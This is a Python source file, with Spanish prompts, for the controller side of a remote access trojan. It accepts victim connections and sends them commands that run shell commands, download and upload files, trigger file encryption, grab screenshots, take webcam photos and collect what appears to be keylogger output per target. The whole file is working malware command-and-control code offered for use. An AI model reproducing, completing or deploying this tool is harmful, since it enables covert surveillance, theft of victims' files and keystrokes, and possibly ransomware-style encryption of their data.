import socket, time
import base64
import socket
import cv2
import numpy as np
from mss import mss
from PIL import Image


connections = []
targets = []

def shell():
    global connections
    opcion = choose_connection()
    
    current_dir = connections[opcion].recv(1024).decode()
    
    
    while True:
        comando = input("{}~#: ".format(current_dir))
        if comando == "exit":
            for connection in connections:
                if (connections[opcion] == connection):
                    connection.send(comando.encode())
                    connection.close()
                    connections.pop(opcion)
            upserver()
            shell()
            break
        elif comando[:2] == "cd":
            for connection in connections:
                connection.send(comando.encode())
                res = connection.recv(1024)
                current_dir = res
                print(res)
        elif comando == "":
            pass 
        elif comando[:8] == "download":
            for connection in connections:
                connection.send(comando.encode())
                with open(comando[9:], 'w') as file_download:
                    datos = connection.recv(1000000).decode()
                    file_download.write(datos)
                    file_download.close()
        elif comando[:6] == "upload":
            for connection in connections:
                connection.send(comando.encode())
                with open(comando[7:], 'r') as file_upload:
                    connection.send(file_upload.read().encode())
                    file_upload.close()
            
        elif comando[:8] == "encripta":
            for connection in connections:
                connection.send(comando.encode())
                with open("hash_file.txt", 'w') as file_download:
                    datos = connection.recv(1000000)
                    file_download.write(datos)
                    file_download.close()
        
        elif comando[:10] == "screenshot":
            count = 2
            for connection in connections:
                connection.send(comando.encode())
                with open("monitor-%d.png" % count, 'wb') as screen:
                    datos = connection.recv(10000000)
                    data_decode = datos
                    if data_decode == "fail":
                        print("No se pudo tomar la captura de pantalla")
                    else: 
                        screen.write(data_decode)
                        print("Captura tomada con exito!")
                        count += 1
        elif comando[:3] == "cam":
            count1 = 2
            for connection in connections:
                connection.send(comando.encode())
                with open("img%d.png" % count1, 'wb') as screen:
                    datos = connection.recv(10000000)
                    data_decode = datos
                    if data_decode == "fail":
                        print("No se pudo tomar la foto")
                    else: 
                        screen.write(data_decode)
                        print("Captura tomada con exito!")
                        count1 += 1
                screen.close()
        elif comando[:3] == "set":
            for connection in connections:
                connection.send(comando.encode())    
            time.sleep(60)
        elif comando[:3] == "get":
            
            
            count2 = 2
            i = 0
            for connection in connections:
                
                connection.send(comando.encode())
                with open(f"{targets[i]}.txt", 'a') as keys:
                    datos = connection.recv(10000000).decode()
                    data_decode = datos
                    if data_decode == "fail":
                        print("No se pudo tomar la foto")
                    else: 
                        keys.write(data_decode)
                        print("Captura tomada con exito!")
                        count2 += 1
                i +=1
            
                    
        else:
            for connection in connections:
                connection.send(comando.encode())
                res = connection.recv(1000000)
                if res == "1":
                    continue
                else:
                    print(res)


def choose_connection():
    global connections

    if len(connections) == 0:
        print("No hay conexiones disponibles.")
        return None

    print("Conexiones disponibles:")
    for i, connection in enumerate(connections):
        print(f"({i}) {connection.getsockname()}")

    selection = input("Ingrese el número de la conexión deseada: ")
    if selection == "exit":
        return None

    try:
        index = int(selection)
        if index < 0 or index >= len(connections):
            print("Selección inválida.")
            return None
        return index
    except ValueError:
        print("Selección inválida.")
        return None

def upserver():
    if(len(connections) > 0):
        answer = input("Desea recibir más conexiones? (y/n): ")
        if answer.lower() == 'n':
            shell()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('127.0.0.1', 22))
    server.listen(5)
    t0 = time.time()
    print("Corriendo servidor y esperando conexiones")
    while True:
        target, ip = server.accept()
        
        connections.append(target)
        print("Conexion recibida de: " + str(ip[0]))
        
        
        if time.time() - t0 > 1:
            op = input("")
            if(op != ""):
                shell()
            else:
                t0 = time.time()
                
            

        

    server.close()
    


upserver()
shell()
